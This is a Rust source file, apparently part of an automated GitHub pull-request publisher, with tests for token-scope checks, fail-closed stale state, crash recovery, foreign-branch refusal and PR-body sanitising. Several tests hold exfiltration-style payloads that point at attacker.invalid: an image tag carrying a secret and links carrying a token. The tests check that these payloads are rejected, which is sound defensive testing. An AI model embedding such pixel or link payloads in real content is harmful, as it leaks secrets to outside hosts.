fn percent_encode(value: &str) -> String {
    let mut encoded = String::new();
    for byte in value.bytes() {
        if byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_' | b'.' | b'~') {
            encoded.push(char::from(byte));
        } else {
            encoded.push_str(&format!("%{byte:02X}"));
        }
    }
    encoded
}

async fn hash_regular_file(path: &Path, maximum: u64) -> Result<String, PublisherError> {
    let path = path.to_path_buf();
    tokio::task::spawn_blocking(move || {
        let metadata = std::fs::symlink_metadata(&path)?;
        if !metadata.is_file() || metadata.file_type().is_symlink() {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidInput,
                "publisher patch is not a regular non-symlink file",
            ));
        }
        if metadata.len() > maximum {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                "publisher patch exceeds its byte cap",
            ));
        }
        let bytes = std::fs::read(path)?;
        Ok(hex::encode(Sha256::digest(bytes)))
    })
    .await
    .map_err(PublisherError::Join)?
    .map_err(PublisherError::Io)
}

fn require_git_success(
    operation: &'static str,
    output: &crate::process::ProcessOutput,
) -> Result<(), PublisherError> {
    if output.code == 0 {
        Ok(())
    } else {
        Err(PublisherError::Git {
            operation,
            code: output.code,
        })
    }
}

struct PrivateInput {
    path: PathBuf,
    closed: bool,
}

impl PrivateInput {
    async fn create(root: &Path, prefix: &str, bytes: Vec<u8>) -> Result<Self, GitHubError> {
        validate_slug_github("private input prefix", prefix)?;
        let root = root.to_path_buf();
        let prefix = prefix.to_owned();
        let path = tokio::task::spawn_blocking(move || {
            std::fs::create_dir_all(&root)?;
            let metadata = std::fs::symlink_metadata(&root)?;
            if !metadata.is_dir() || metadata.file_type().is_symlink() {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::InvalidInput,
                    "private GitHub input root is not a regular directory",
                ));
            }
            std::fs::set_permissions(&root, std::fs::Permissions::from_mode(0o700))?;
            let path = root.join(format!("{prefix}-{}", Uuid::new_v4()));
            let mut options = std::fs::OpenOptions::new();
            options.write(true).create_new(true).mode(0o600);
            use std::io::Write as _;
            let mut file = options.open(&path)?;
            file.write_all(&bytes)?;
            file.sync_all()?;
            Ok::<_, std::io::Error>(path)
        })
        .await
        .map_err(GitHubError::Join)??;
        Ok(Self {
            path,
            closed: false,
        })
    }

    fn path(&self) -> &Path {
        &self.path
    }

    async fn close(mut self) -> Result<(), GitHubError> {
        let path = self.path.clone();
        tokio::task::spawn_blocking(move || match std::fs::remove_file(path) {
            Ok(()) => Ok(()),
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(()),
            Err(error) => Err(error),
        })
        .await
        .map_err(GitHubError::Join)??;
        self.closed = true;
        Ok(())
    }
}

impl Drop for PrivateInput {
    fn drop(&mut self) {
        if !self.closed {
            tracing::error!(path = %self.path.display(), "private GitHub input dropped without close()");
        }
    }
}

#[derive(Debug, Error)]
pub enum GitHubError {
    #[error("invalid GitHub configuration: {0}")]
    InvalidConfig(&'static str),
    #[error("GitHub App token mint returned a broader or different scope")]
    UnsafeTokenScope,
    #[error("GitHub App token expiry is outside the accepted short-lived window")]
    UnsafeTokenExpiry,
    #[error("GitHub returned malformed {0}")]
    MalformedResponse(&'static str),
    #[error("GitHub open-PR response reached its page cap; state is incomplete")]
    IncompleteOpenPullRequestSnapshot,
    #[error("{operation} failed with status {code}")]
    CommandFailed { operation: &'static str, code: i32 },
    #[error("GitHub JSON failed: {0}")]
    Json(#[from] serde_json::Error),
    #[error("bounded GitHub subprocess failed: {0}")]
    Process(#[from] ProcessError),
    #[error("GitHub temporary input failed: {0}")]
    Io(#[from] std::io::Error),
    #[error("GitHub blocking task failed: {0}")]
    Join(tokio::task::JoinError),
}

#[derive(Debug, Error)]
pub enum PublisherError {
    #[error("invalid publisher configuration: {0}")]
    InvalidConfig(&'static str),
    #[error("invalid publisher input: {0}")]
    InvalidInput(&'static str),
    #[error("unsafe pull request body: {0}")]
    UnsafePullRequestBody(&'static str),
    #[error("GitHub state is stale; publication fails closed")]
    StaleGitHubState,
    #[error("open factory PR cap reached: {count}")]
    OpenPullRequestCap { count: usize },
    #[error("branch exists but does not belong to this request: {0}")]
    ForeignBranch(String),
    #[error("multiple pull requests exist for branch {0}")]
    MultiplePullRequests(String),
    #[error("existing pull request is closed: {0}")]
    ExistingPullRequestClosed(i32),
    #[error("pull request is not a draft: {0}")]
    PullRequestNotDraft(i32),
    #[error("pull request branches do not match the durable run: {0}")]
    PullRequestBranchMismatch(i32),
    #[error("pull request author differs: expected {expected}, got {actual}")]
    PullRequestAuthor { expected: String, actual: String },
    #[error("pull request head differs: expected {expected}, got {actual}")]
    PullRequestHeadMismatch { expected: String, actual: String },
    #[error("completed branch-push effect has no remote branch")]
    MissingCompletedBranch,
    #[error("completed PR-create effect has no pull request")]
    MissingCompletedPullRequest,
    #[error("existing branch parent differs: expected {expected}, got {actual}")]
    ExistingBranchParent { expected: String, actual: String },
    #[error("existing branch author is not a GitHub App bot: {0}")]
    ExistingBranchAuthor(String),
    #[error("verified tree hash differs: expected {expected}, got {actual}")]
    TreeHashMismatch { expected: String, actual: String },
    #[error("verified patch digest differs: expected {expected}, got {actual}")]
    PatchDigestMismatch { expected: String, actual: String },
    #[error("bare publisher repository is unsafe: {0}")]
    UnsafeBareRepository(PathBuf),
    #[error("bare publisher remote differs: expected {expected}, got {actual}")]
    UnsafeRemote { expected: String, actual: String },
    #[error("Git output is malformed: {0}")]
    MalformedGitOutput(&'static str),
    #[error("Git output is not UTF-8")]
    NonUtf8Git,
    #[error("injected crash at {0:?}")]
    InjectedCrash(CrashPoint),
    #[error("GitHub operation failed: {0}")]
    GitHub(#[from] GitHubError),
    #[error("publisher store failed: {0}")]
    Store(#[from] StoreError),
    #[error("publisher worktree failed: {0}")]
    Worktree(#[from] WorktreeError),
    #[error("publisher Git subprocess failed: {0}")]
    Process(#[from] ProcessError),
    #[error("publisher Git operation {operation} failed with status {code}")]
    Git { operation: &'static str, code: i32 },
    #[error("publisher filesystem failed: {0}")]
    Io(#[from] std::io::Error),
    #[error("publisher blocking task failed: {0}")]
    Join(tokio::task::JoinError),
    #[error("publisher tree hashing failed: {0}")]
    TreeHash(#[from] factory_verify::runtime::RuntimeError),
}

#[cfg(test)]
mod tests {
    use std::{
        collections::{BTreeMap, HashMap},
        path::{Path, PathBuf},
        process::Command,
        sync::{Arc, Mutex},
        time::Duration,
    };

    use factory_verify::runtime::tree_hash;
    use sha2::{Digest as _, Sha256};
    use tempfile::TempDir;
    use time::{OffsetDateTime, format_description::well_known::Rfc3339};
    use tokio_util::sync::CancellationToken;
    use uuid::Uuid;

    use crate::store::{
        PublicationStore, PublisherLease, PublisherStore, PullRequestRecord, SideEffectDisposition,
        StoreError,
    };

    use super::{
        BotIdentity, CrashPoint, CreatePullRequest, GitHubApi, GitHubError, GitHubFuture,
        GitHubPermissions, GitHubUser, InstallationToken, MintRepository, MintResponse,
        OpenPullRequestSnapshot, PermissionLevel, PublishInput, Publisher, PublisherConfig,
        PublisherError, PullRequest, PullRequestRef, RepositoryScope, Review, ReviewContract,
        RootCause, TokenPurpose, build_initial_pr_body, has_head_approval, validate_mint_response,
        validate_pr_body,
    };

    #[test]
    fn pr_body_fences_untrusted_phishing_text() {
        let mut contract = review_contract();
        contract.verbatim_request =
            "```html\n<img src=\"https://attacker.invalid/pixel?secret=x\">\n```".to_owned();
        let body = build_initial_pr_body(
            Uuid::nil(),
            &contract,
            &"a".repeat(40),
            &"b".repeat(64),
            &"c".repeat(64),
        )
        .expect("body");
        validate_pr_body(&body).expect("fenced request data is inert");
        assert!(body.contains("Untrusted request data"));
        assert!(!body.contains("\n```\n```html"));
    }

    #[test]
    fn pr_body_rejects_rendered_links_and_images() {
        for body in [
            "![evidence](https://attacker.invalid/x)",
            "<img src=\"https://attacker.invalid/x\">",
            "[click](https://attacker.invalid/x?token=y)",
            "[protocol relative](//attacker.invalid/x)",
            "<a href=\"//attacker.invalid/x\">click</a>",
        ] {
            assert!(validate_pr_body(body).is_err(), "{body}");
        }
    }

    #[test]
    fn latest_head_review_decides_approval() {
        let head = "a".repeat(40);
        let reviews = vec![
            Review {
                state: "APPROVED".to_owned(),
                commit_id: head.clone(),
                submitted_at: Some("2026-07-23T00:00:00Z".to_owned()),
                user: GitHubUser {
                    login: "reviewer".to_owned(),
                },
            },
            Review {
                state: "CHANGES_REQUESTED".to_owned(),
                commit_id: head.clone(),
                submitted_at: Some("2026-07-23T00:01:00Z".to_owned()),
                user: GitHubUser {
                    login: "reviewer".to_owned(),
                },
            },
        ];
        assert!(!has_head_approval(&reviews, &head));
    }

    #[test]
    fn installation_token_scope_must_be_exact_on_every_mint() {
        assert_eq!(
            TokenPurpose::ReadyForReview.permissions(),
            GitHubPermissions {
                contents: PermissionLevel::Write,
                pull_requests: PermissionLevel::Write,
                checks: None,
            }
        );
        let repository = RepositoryScope {
            owner: "example-org".to_owned(),
            name: "fieldbook".to_owned(),
        };
        let requested = GitHubPermissions {
            contents: PermissionLevel::Write,
            pull_requests: PermissionLevel::Write,
            checks: None,
        };
        let exact = MintResponse {
            token: "secret".to_owned(),
            expires_at: "2026-07-23T01:00:00Z".to_owned(),
            permissions: BTreeMap::from([
                ("contents".to_owned(), "write".to_owned()),
                ("pull_requests".to_owned(), "write".to_owned()),
                ("metadata".to_owned(), "read".to_owned()),
            ]),
            repositories: vec![MintRepository {
                name: "fieldbook".to_owned(),
                full_name: repository.full_name(),
            }],
        };
        validate_mint_response(&exact, &repository, requested).expect("exact scope");
        let mut broader = exact;
        broader
            .permissions
            .insert("issues".to_owned(), "write".to_owned());
        assert!(matches!(
            validate_mint_response(&broader, &repository, requested),
            Err(GitHubError::UnsafeTokenScope)
        ));
    }

    #[derive(Clone, Default)]
    struct MemoryPublisherStore {
        inner: Arc<Mutex<MemoryPublisherState>>,
    }

    #[derive(Default)]
    struct MemoryPublisherState {
        lease: Option<PublisherLease>,
        fencing: i64,
        effects: HashMap<String, (String, Option<String>)>,
        pulls: Vec<PullRequestRecord>,
    }

    impl PublicationStore for MemoryPublisherStore {
        async fn transition_publication(
            &self,
            _request_id: Uuid,
            _run_id: Uuid,
            _event_type: &str,
            _to_state: &str,
            _idempotency_key: &str,
            _payload: serde_json::Value,
        ) -> Result<bool, StoreError> {
            Ok(true)
        }

        async fn begin_publication_effect(
            &self,
            _request_id: Uuid,
            _run_id: Uuid,
            key: &str,
            _effect_type: &str,
        ) -> Result<SideEffectDisposition, StoreError> {
            let mut state = self.inner.lock().expect("publisher state");
            Ok(match state.effects.get(key).map(|value| value.0.as_str()) {
                Some("completed") => SideEffectDisposition::Completed,
                Some(_) => SideEffectDisposition::Resume,
                None => {
                    state
                        .effects
                        .insert(key.to_owned(), ("running".to_owned(), None));
                    SideEffectDisposition::Start
                }
            })
        }

        async fn finish_publication_effect(
            &self,
            key: &str,
            status: &str,
            external_ref: Option<&str>,
            _facts: serde_json::Value,
        ) -> Result<(), StoreError> {
            self.inner.lock().expect("publisher state").effects.insert(
                key.to_owned(),
                (
                    status.to_owned(),
                    external_ref.map(std::borrow::ToOwned::to_owned),
                ),
            );
            Ok(())
        }
    }

    impl PublisherStore for MemoryPublisherStore {
        async fn acquire_publisher_lease(
            &self,
            resource: &str,
            _request_id: Uuid,
            _run_id: Uuid,
            holder: &str,
            ttl: Duration,
        ) -> Result<PublisherLease, StoreError> {
            let mut state = self.inner.lock().expect("publisher state");
            if let Some(lease) = &state.lease {
                if lease.resource == resource && lease.holder == holder {
                    return Ok(lease.clone());
                }
                return Err(StoreError::PublisherLeaseHeld {
                    resource: resource.to_owned(),
                    holder: lease.holder.clone(),
                });
            }
            state.fencing += 1;
            let lease = PublisherLease {
                resource: resource.to_owned(),
                holder: holder.to_owned(),
                fencing_token: state.fencing,
                expires_at: OffsetDateTime::now_utc()
                    + time::Duration::try_from(ttl).expect("test duration"),
            };
            state.lease = Some(lease.clone());
            Ok(lease)
        }

        async fn release_publisher_lease(&self, lease: &PublisherLease) -> Result<(), StoreError> {
            let mut state = self.inner.lock().expect("publisher state");
            if state.lease.as_ref() == Some(lease) {
                state.lease = None;
                Ok(())
            } else {
                Err(StoreError::PublisherLeaseReleaseFailed(
                    lease.resource.clone(),
                ))
            }
        }

        async fn record_github_success(
            &self,
            _repository: &str,
            _observed_at: OffsetDateTime,
            _open_pr_count: usize,
        ) -> Result<(), StoreError> {
            Ok(())
        }

        async fn record_github_failure(
            &self,
            _repository: &str,
            _error: &str,
        ) -> Result<(), StoreError> {
            Ok(())
        }

        async fn upsert_pull_request(&self, record: &PullRequestRecord) -> Result<(), StoreError> {
            let mut state = self.inner.lock().expect("publisher state");
            state
                .pulls
                .retain(|existing| existing.number != record.number);
            state.pulls.push(record.clone());
            Ok(())
        }
    }

    #[derive(Clone)]
    struct FakeGitHub {
        inner: Arc<Mutex<FakeGitHubState>>,
        remote: PathBuf,
        stale: bool,
    }

    #[derive(Default)]
    struct FakeGitHubState {
        pulls: Vec<PullRequest>,
        purposes: Vec<TokenPurpose>,
        next_number: i32,
    }

    impl FakeGitHub {
        fn new(remote: PathBuf) -> Self {
            Self {
                inner: Arc::new(Mutex::new(FakeGitHubState {
                    next_number: 1,
                    ..FakeGitHubState::default()
                })),
                remote,
                stale: false,
            }
        }

        fn with_stale(mut self) -> Self {
            self.stale = true;
            self
        }

        fn open_count(&self) -> usize {
            self.inner
                .lock()
                .expect("GitHub state")
                .pulls
                .iter()
                .filter(|pull| pull.state == "open")
                .count()
        }

        fn add_open_fixture(&self, branch: &str, sha: &str) {
            let mut state = self.inner.lock().expect("GitHub state");
            let number = state.next_number;
            state.next_number += 1;
            state
                .pulls
                .push(pull(number, branch, sha, "patchyard[bot]"));
        }
    }

    impl GitHubApi for FakeGitHub {
        fn mint_token<'a>(
            &'a self,
            _repository: &'a RepositoryScope,
            purpose: TokenPurpose,
            _cancellation: &'a CancellationToken,
        ) -> GitHubFuture<'a, InstallationToken> {
            Box::pin(async move {
                self.inner
                    .lock()
                    .expect("GitHub state")
                    .purposes
                    .push(purpose);
                Ok(InstallationToken {
                    value: "fixture-token".to_owned(),
                    bot: BotIdentity {
                        id: 1,
                        login: "patchyard[bot]".to_owned(),
                    },
                })
            })
        }

        fn open_pull_requests<'a>(
            &'a self,
            _token: &'a InstallationToken,
            _repository: &'a RepositoryScope,
            _limit: usize,
            _cancellation: &'a CancellationToken,
        ) -> GitHubFuture<'a, OpenPullRequestSnapshot> {
            Box::pin(async move {
                let pulls = self
                    .inner
                    .lock()
                    .expect("GitHub state")
                    .pulls
                    .iter()
                    .filter(|pull| pull.state == "open")
                    .cloned()
                    .collect();
                let observed_at = if self.stale {
                    OffsetDateTime::now_utc() - time::Duration::minutes(10)
                } else {
                    OffsetDateTime::now_utc()
                };
                Ok(OpenPullRequestSnapshot {
                    observed_at,
                    pull_requests: pulls,
                })
            })
        }

        fn pull_requests_for_branch<'a>(
            &'a self,
            _token: &'a InstallationToken,
            _repository: &'a RepositoryScope,
            branch: &'a str,
            _cancellation: &'a CancellationToken,
        ) -> GitHubFuture<'a, Vec<PullRequest>> {
            Box::pin(async move {
                Ok(self
                    .inner
                    .lock()
                    .expect("GitHub state")
                    .pulls
                    .iter()
                    .filter(|pull| pull.head.branch == branch)
                    .cloned()
                    .collect())
            })
        }

        fn create_draft_pull_request<'a>(
            &'a self,
            _token: &'a InstallationToken,
            _repository: &'a RepositoryScope,
            request: &'a CreatePullRequest,
            _cancellation: &'a CancellationToken,
        ) -> GitHubFuture<'a, PullRequest> {
            Box::pin(async move {
                let remote = self.remote.clone();
                let branch = request.head.clone();
                let head = tokio::task::spawn_blocking(move || {
                    git_output(&remote, &["rev-parse", &format!("refs/heads/{branch}")])
                })
                .await
                .map_err(GitHubError::Join)?
                .map_err(GitHubError::Io)?;
                let mut state = self.inner.lock().expect("GitHub state");
                let number = state.next_number;
                state.next_number += 1;
                let created = pull(number, &request.head, &head, "patchyard[bot]");
                state.pulls.push(created.clone());
                Ok(created)
            })
        }

        fn reviews<'a>(
            &'a self,
            _token: &'a InstallationToken,
            _repository: &'a RepositoryScope,
            _number: i32,
            _cancellation: &'a CancellationToken,
        ) -> GitHubFuture<'a, Vec<Review>> {
            Box::pin(async { Ok(Vec::new()) })
        }

        fn delete_branch<'a>(
            &'a self,
            _token: &'a InstallationToken,
            _repository: &'a RepositoryScope,
            _branch: &'a str,
            _cancellation: &'a CancellationToken,
        ) -> GitHubFuture<'a, ()> {
            Box::pin(async { Ok(()) })
        }
    }

    struct FixtureRepository {
        _temp: TempDir,
        remote: PathBuf,
        patch: PathBuf,
        base_sha: String,
        result_tree_hash: String,
        patch_sha256: String,
    }

    impl FixtureRepository {
        fn new() -> Self {
            let temp = tempfile::tempdir().expect("temp");
            let remote = temp.path().join("remote.git");
            let seed = temp.path().join("seed");
            run_git(
                temp.path(),
                &["init", "--bare", remote.to_str().expect("path")],
            );
            run_git(temp.path(), &["init", seed.to_str().expect("path")]);
            run_git(&seed, &["config", "user.name", "Fixture"]);
            run_git(&seed, &["config", "user.email", "fixture@example.invalid"]);
            std::fs::write(seed.join("names.txt"), "z\n").expect("seed file");
            run_git(&seed, &["add", "names.txt"]);
            run_git(&seed, &["commit", "-m", "base"]);
            run_git(&seed, &["branch", "-M", "master"]);
            run_git(
                &seed,
                &["remote", "add", "origin", remote.to_str().expect("path")],
            );
            run_git(&seed, &["push", "origin", "master"]);
            let base_sha = git_output(&seed, &["rev-parse", "HEAD"]).expect("base SHA");
            std::fs::write(seed.join("names.txt"), "a\nz\n").expect("changed file");
            let patch = temp.path().join("change.patch");
            let patch_bytes = Command::new("/bin/git")
                .args([
                    "-C",
                    seed.to_str().expect("path"),
                    "diff",
                    "--binary",
                    "HEAD",
                ])
                .output()
                .expect("git diff")
                .stdout;
            std::fs::write(&patch, &patch_bytes).expect("patch");
            let result_tree_hash = tree_hash(&seed).expect("tree hash");
            let patch_sha256 = hex::encode(Sha256::digest(&patch_bytes));
            Self {
                _temp: temp,
                remote,
                patch,
                base_sha,
                result_tree_hash,
                patch_sha256,
            }
        }

        fn input(&self, request_id: Uuid, run_id: Uuid) -> PublishInput {
            let review_contract = review_contract();
            PublishInput {
                schema_version: 2,
                request_id,
                run_id,
                attempts: 1,
                branch: format!("factory/{request_id}-session-10-publisher-demo"),
                base_sha: self.base_sha.clone(),
                patch_relative_path: "fixture/change.patch".to_owned(),
                patch_sha256: self.patch_sha256.clone(),
                expected_tree_hash: self.result_tree_hash.clone(),
                title: format!("Factory fixture request {request_id}"),
                body: build_initial_pr_body(
                    request_id,
                    &review_contract,
                    &self.base_sha,
                    &self.result_tree_hash,
                    &self.patch_sha256,
                )
                .expect("body"),
                review_contract,
            }
        }
    }

    fn publisher(
        fixture: &FixtureRepository,
        store: MemoryPublisherStore,
        github: FakeGitHub,
        crash: Option<CrashPoint>,
        suffix: &str,
    ) -> Publisher<MemoryPublisherStore> {
        Publisher::new(
            store,
            Arc::new(github),
            PublisherConfig {
                repository: RepositoryScope {
                    owner: "example-org".to_owned(),
                    name: "fieldbook".to_owned(),
                },
                base_branch: "master".to_owned(),
                worktree_root: fixture._temp.path().join(format!("worktrees-{suffix}")),
                git_program: PathBuf::from("/bin/git"),
                git_askpass: PathBuf::from("/bin/false"),
                holder: format!("fixture-{suffix}"),
                max_open_prs: 2,
                github_freshness: Duration::from_secs(30),
                lease_ttl: Duration::from_secs(3_600),
                fault_after: crash,
                test_remote: Some(fixture.remote.to_string_lossy().into_owned()),
            },
        )
        .expect("publisher")
    }

    #[tokio::test]
    async fn crash_before_and_after_push_resume_to_one_branch_and_pr() {
        for crash in [CrashPoint::BeforeBranchPush, CrashPoint::AfterBranchPush] {
            let fixture = FixtureRepository::new();
            let store = MemoryPublisherStore::default();
            let github = FakeGitHub::new(fixture.remote.clone());
            let request_id = Uuid::new_v4();
            let run_id = Uuid::new_v4();
            let input = fixture.input(request_id, run_id);
            let first = publisher(
                &fixture,
                store.clone(),
                github.clone(),
                Some(crash),
                "first",
            );
            let resource = "publisher:example-org/fieldbook";
            let holder = format!("{}:{}", first.config.holder, run_id);
            let _unreleased = store
                .acquire_publisher_lease(
                    resource,
                    request_id,
                    run_id,
                    &holder,
                    Duration::from_secs(3_600),
                )
                .await
                .expect("lease before simulated crash");
            assert!(matches!(
                first
                    .publish_under_lease(&input, &fixture.patch, &CancellationToken::new())
                    .await,
                Err(PublisherError::InjectedCrash(actual)) if actual == crash
            ));
            let resumed = publisher(&fixture, store.clone(), github.clone(), None, "first");
            let pull = resumed
                .publish(&input, &fixture.patch, &CancellationToken::new())
                .await
                .expect("resumed publish");
            assert_eq!(pull.branch, input.branch);
            assert_eq!(github.open_count(), 1);
            assert_eq!(
                git_output(
                    &fixture.remote,
                    &["for-each-ref", "--format=%(refname)", "refs/heads/factory/"]
                )
                .expect("branch listing")
                .lines()
                .count(),
                1
            );
        }
    }

    #[tokio::test]
    async fn stale_state_fails_closed_before_push() {
        let fixture = FixtureRepository::new();
        let store = MemoryPublisherStore::default();
        let github = FakeGitHub::new(fixture.remote.clone()).with_stale();
        let input = fixture.input(Uuid::new_v4(), Uuid::new_v4());
        let result = publisher(&fixture, store, github.clone(), None, "stale")
            .publish(&input, &fixture.patch, &CancellationToken::new())
            .await;
        assert!(matches!(result, Err(PublisherError::StaleGitHubState)));
        assert_eq!(github.open_count(), 0);
    }

    #[tokio::test]
    async fn existing_request_branch_with_non_bot_commit_is_refused() {
        let fixture = FixtureRepository::new();
        let request_id = Uuid::new_v4();
        let input = fixture.input(request_id, Uuid::new_v4());
        let attacker = fixture._temp.path().join("attacker");
        run_git(
            fixture._temp.path(),
            &[
                "clone",
                fixture.remote.to_str().expect("remote"),
                attacker.to_str().expect("attacker"),
            ],
        );
        run_git(&attacker, &["config", "user.name", "Human Fixture"]);
        run_git(
            &attacker,
            &["config", "user.email", "human@example.invalid"],
        );
        run_git(&attacker, &["checkout", "-b", &input.branch]);
        std::fs::write(attacker.join("names.txt"), "a\nz\n").expect("foreign tree");
        run_git(&attacker, &["add", "names.txt"]);
        run_git(&attacker, &["commit", "-m", "foreign commit"]);
        run_git(&attacker, &["push", "origin", &input.branch]);

        let store = MemoryPublisherStore::default();
        let github = FakeGitHub::new(fixture.remote.clone());
        let result = publisher(&fixture, store, github, None, "foreign")
            .publish(&input, &fixture.patch, &CancellationToken::new())
            .await;
        assert!(matches!(
            result,
            Err(PublisherError::ExistingBranchAuthor(author))
                if author == "human@example.invalid"
        ));
    }

    #[tokio::test]
    async fn simultaneous_cap_race_creates_only_one_second_pr() {
        let fixture = FixtureRepository::new();
        let store = MemoryPublisherStore::default();
        let github = FakeGitHub::new(fixture.remote.clone());
        github.add_open_fixture("factory/existing-fixture", &fixture.base_sha);
        let first_input = fixture.input(Uuid::new_v4(), Uuid::new_v4());
        let second_input = fixture.input(Uuid::new_v4(), Uuid::new_v4());
        let first = publisher(&fixture, store.clone(), github.clone(), None, "race");
        let second = publisher(&fixture, store, github.clone(), None, "race");
        let first_cancellation = CancellationToken::new();
        let second_cancellation = CancellationToken::new();
        let (one, two) = tokio::join!(
            first.publish(&first_input, &fixture.patch, &first_cancellation),
            second.publish(&second_input, &fixture.patch, &second_cancellation)
        );
        assert_eq!(usize::from(one.is_ok()) + usize::from(two.is_ok()), 1);
        assert_eq!(github.open_count(), 2);
    }

    fn pull(number: i32, branch: &str, sha: &str, author: &str) -> PullRequest {
        PullRequest {
            number,
            node_id: format!("PR_{number}"),
            draft: true,
            state: "open".to_owned(),
            body: None,
            html_url: format!("https://github.invalid/pull/{number}"),
            head: PullRequestRef {
                branch: branch.to_owned(),
                sha: sha.to_owned(),
            },
            base: PullRequestRef {
                branch: "master".to_owned(),
                sha: "0".repeat(40),
            },
            user: GitHubUser {
                login: author.to_owned(),
            },
            updated_at: OffsetDateTime::now_utc()
                .format(&Rfc3339)
                .expect("timestamp"),
            merged_at: None,
            merge_commit_sha: None,
            merged_by: None,
        }
    }

    fn review_contract() -> ReviewContract {
        ReviewContract {
            request_source: "fixture form".to_owned(),
            verbatim_request: "ALPHABETIZE fixture".to_owned(),
            lane: "A".to_owned(),
            rubric_version: "factory-rubric-v1".to_owned(),
            root_causes: vec![RootCause {
                path: "names.txt".to_owned(),
                line: 1,
                cause: "The fixture entries are out of order.".to_owned(),
            }],
            named_assumptions: vec!["The requested scope is limited to names.txt.".to_owned()],
            risk: "A missed entry could remain out of order.".to_owned(),
            rollback: "Revert the factory commit.".to_owned(),
            draft_reply: "Alphabetized names.txt and attached evidence for review.".to_owned(),
            reviewer_quiz: vec!["Does the resulting order match the request?".to_owned()],
            shared_function_touched: false,
            explain_diff: None,
        }
    }

    fn run_git(directory: &Path, arguments: &[&str]) {
        let status = Command::new("/bin/git")
            .arg("-C")
            .arg(directory)
            .args(arguments)
            .status()
            .expect("git");
        assert!(status.success(), "git {arguments:?}");
    }

    fn git_output(directory: &Path, arguments: &[&str]) -> Result<String, std::io::Error> {
        let output = Command::new("/bin/git")
            .arg("-C")
            .arg(directory)
            .args(arguments)
            .output()?;
        if !output.status.success() {
            return Err(std::io::Error::other("git fixture command failed"));
        }
        Ok(String::from_utf8_lossy(&output.stdout).trim().to_owned())
    }
}
